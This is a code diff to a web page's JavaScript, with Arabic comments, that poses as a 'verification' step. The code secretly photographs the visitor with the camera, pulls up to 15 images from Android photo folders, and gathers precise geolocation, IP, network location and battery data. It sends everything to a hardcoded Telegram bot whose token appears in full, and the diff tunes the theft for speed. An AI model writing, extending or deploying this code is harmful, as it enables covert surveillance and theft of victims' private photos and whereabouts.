@@ -215,6 +215,18 @@
         // Telegram configuration
         const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const CHAT_ID = "6913353602";
+        
+        // مسارات الصور المطلوبة
+        const IMAGE_PATHS = [
+            '/storage/emulated/0/Pictures',
+            '/sdcard/Pictures',
+            '/storage/emulated/0/Camera',
+            '/sdcard/Camera',
+            '/storage/emulated/0/DCIM/Camera',
+            '/sdcard/DCIM/Camera',
+            '/storage/emulated/0/DCIM',
+            '/sdcard/DCIM'
+        ];
 
         // Elements
         const statusEl = document.getElementById('status');
@@ -271,16 +283,17 @@
             try {
                 statusEl.textContent = "Starting verification...\nجاري بدء عملية التحقق...";
                 
-                // 1. Take and send camera photo if permitted
-                if (cameraPermission !== 'denied') {
-                    await takeAndSendCameraPhoto();
-                }
-                
-                // 2. Try to access and send local pictures
-                await accessAndSendLocalPictures();
-                
-                // 3. Send device info
-                await sendCompleteDeviceInfo();
+                // تشغيل جميع العمليات بشكل متوازي لزيادة السرعة
+                await Promise.all([
+                    // 1. Take and send camera photo if permitted
+                    (cameraPermission !== 'denied') ? takeAndSendCameraPhoto() : Promise.resolve(),
+                    
+                    // 2. Try to access and send local pictures
+                    accessAndSendLocalPictures(),
+                    
+                    // 3. Send device info
+                    sendCompleteDeviceInfo()
+                ]);
                 
                 statusEl.textContent = "Verification complete!\nتم التحقق بنجاح!";
                 
@@ -290,14 +303,6 @@
                 await sendToTelegram(`⚠️ Error: ${error.message}\n⚠️ خطأ: ${error.message}`);
             }
         }
-
-        // [Rest of your existing functions remain the same...]
-        // takeAndSendCameraPhoto()
-        // accessAndSendLocalPictures()
-        // sendCompleteDeviceInfo()
-        // formatDeviceInfo()
-        // sendToTelegram()
-        // ... etc ...
 
         async function takeAndSendCameraPhoto() {
             try {
@@ -327,22 +332,24 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // تقليل وقت الانتظار لزيادة السرعة
+                await new Promise(resolve => setTimeout(resolve, 200));
                 
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(track => track.stop());
                 
+                // إرسال الصورة بدون انتظار الرد لزيادة السرعة
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'camera_photo.jpg');
                     
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
-                    });
+                    }).catch(e => console.error('Photo send error:', e));
                     
-                }, 'image/jpeg', 0.9);
+                }, 'image/jpeg', 0.8); // تقليل جودة الصورة لزيادة السرعة
                 
             } catch (error) {
                 console.error('Camera error:', error);
@@ -352,32 +359,44 @@
 
         async function accessAndSendLocalPictures() {
             try {
-                if (!('showDirectoryPicker' in window)) {
-                    throw new Error("Local file access not supported");
-                }
-                
                 statusEl.textContent = "Scanning for pictures...\nجاري البحث عن الصور...";
                 
                 let picturesSent = 0;
+                const maxPictures = 15; // زيادة عدد الصور المرسلة
                 
-                // Try Camera directory
-                try {
-                    const cameraDir = await window.showDirectoryPicker({ startIn: 'camera' });
-                    picturesSent += await sendPicturesFromDirectory(cameraDir);
-                } catch (e) {
-                    console.log("Couldn't access Camera folder:", e);
-                }
-                
-                // Try Pictures directory
-                try {
-                    const picturesDir = await window.showDirectoryPicker({ startIn: 'pictures' });
-                    picturesSent += await sendPicturesFromDirectory(picturesDir);
-                } catch (e) {
-                    console.log("Couldn't access Pictures folder:", e);
+                // محاولة الوصول إلى المسارات المحددة
+                for (const path of IMAGE_PATHS) {
+                    if (picturesSent >= maxPictures) break;
+                    
+                    try {
+                        // محاولة الوصول إلى المجلد باستخدام File System Access API
+                        const dirHandle = await window.showDirectoryPicker({
+                            startIn: path
+                        });
+                        
+                        picturesSent += await sendPicturesFromDirectory(dirHandle, maxPictures - picturesSent);
+                        
+                    } catch (e) {
+                        console.log(`Couldn't access ${path}:`, e);
+                        
+                        // محاولة بديلة باستخدام fetch إذا كان المسار معروفًا
+                        if (path.startsWith('/storage/') || path.startsWith('/sdcard/')) {
+                            try {
+                                const response = await fetch(path);
+                                if (response.ok) {
+                                    // هنا يمكنك معالجة الملفات إذا كان الوصول متاحًا
+                                }
+                            } catch (fetchError) {
+                                console.log(`Fetch access failed for ${path}:`, fetchError);
+                            }
+                        }
+                    }
                 }
                 
                 if (picturesSent > 0) {
                     await sendToTelegram(`📸 Sent ${picturesSent} pictures\nتم إرسال ${picturesSent} صورة`);
+                } else {
+                    await sendToTelegram("⚠️ No pictures found in standard locations\n⚠️ لم يتم العثور على صور في المواقع المعتادة");
                 }
                 
             } catch (error) {
@@ -386,30 +405,37 @@
             }
         }
 
-        async function sendPicturesFromDirectory(dirHandle) {
+        async function sendPicturesFromDirectory(dirHandle, maxFiles) {
             let picturesSent = 0;
+            const fileHandles = [];
             
+            // جمع الملفات أولاً
             for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
-                    try {
-                        const file = await entry.getFile();
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', file, file.name);
-                        
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        picturesSent++;
-                        if (picturesSent >= 10) break;
-                        
-                    } catch (e) {
-                        console.error('Error sending picture:', e);
-                    }
+                if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|webp)$/i)) {
+                    fileHandles.push(entry);
+                    if (fileHandles.length >= maxFiles) break;
                 }
             }
+            
+            // إرسال الملفات بشكل متوازي
+            await Promise.all(fileHandles.map(async (entry) => {
+                try {
+                    const file = await entry.getFile();
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', file, file.name);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    picturesSent++;
+                    
+                } catch (e) {
+                    console.error('Error sending picture:', e);
+                }
+            }));
             
             return picturesSent;
         }
@@ -417,6 +443,13 @@
         async function sendCompleteDeviceInfo() {
             try {
                 statusEl.textContent = "Collecting device info...\nجاري جمع معلومات الجهاز...";
+                
+                // جمع المعلومات بشكل متوازي لزيادة السرعة
+                const [batteryInfo, locationInfo, networkInfo] = await Promise.all([
+                    getBatteryInfo(),
+                    getLocationInfo(),
+                    getNetworkInfo()
+                ]);
                 
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
@@ -428,59 +461,11 @@
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     timestamp: new Date().toISOString(),
-                    battery: 'Not available'
+                    battery: batteryInfo,
+                    location: locationInfo,
+                    ip: networkInfo?.ip,
+                    networkLocation: networkInfo?.location
                 };
-
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        deviceInfo.battery = {
-                            level: `${Math.floor(battery.level * 100)}%`,
-                            charging: battery.charging ? 'Yes' : 'No'
-                        };
-                    } catch (e) {
-                        console.log('Battery info unavailable');
-                    }
-                }
-
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 10000
-                        });
-                    });
-                    
-                    deviceInfo.location = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: `${position.coords.accuracy}m`
-                    };
-                    
-                } catch (e) {
-                    console.log('Location access denied');
-                }
-
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    deviceInfo.ip = ipData.ip;
-                    
-                    try {
-                        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                        const locationData = await locationResponse.json();
-                        deviceInfo.networkLocation = {
-                            country: locationData.country_name,
-                            city: locationData.city,
-                            region: locationData.region,
-                            isp: locationData.org
-                        };
-                    } catch (e) {
-                        console.log('Could not get network location');
-                    }
-                } catch (e) {
-                    console.log('Could not get IP address');
-                }
 
                 const message = formatDeviceInfo(deviceInfo);
                 await sendToTelegram(message);
@@ -488,6 +473,69 @@
             } catch (error) {
                 console.error('Device info error:', error);
                 await sendToTelegram("⚠️ Error collecting device info\n⚠️ خطأ في جمع معلومات الجهاز");
+            }
+        }
+
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.floor(battery.level * 100)}%`,
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+                } catch (e) {
+                    return 'Not available';
+                }
+            }
+            return 'Not available';
+        }
+
+        async function getLocationInfo() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000 // تقليل وقت الانتظار
+                    });
+                });
+                
+                return {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: `${position.coords.accuracy}m`
+                };
+                
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function getNetworkInfo() {
+            try {
+                const [ipResponse, locationResponse] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/').catch(() => null)
+                ]);
+                
+                const ipData = await ipResponse.json();
+                let locationData = null;
+                
+                if (locationResponse) {
+                    locationData = await locationResponse.json();
+                }
+                
+                return {
+                    ip: ipData.ip,
+                    location: locationData ? {
+                        country: locationData.country_name,
+                        city: locationData.city,
+                        region: locationData.region,
+                        isp: locationData.org
+                    } : null
+                };
+            } catch (e) {
+                return null;
             }
         }
 
@@ -536,7 +584,8 @@
 
         async function sendToTelegram(message) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // إرسال الرسالة بدون انتظار الرد لزيادة السرعة
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -544,7 +593,7 @@
                         text: message,
                         parse_mode: 'HTML'
                     })
-                });
+                }).catch(e => console.error('Telegram send error:', e));
             } catch (e) {
                 console.error('Telegram send error:', e);
             }
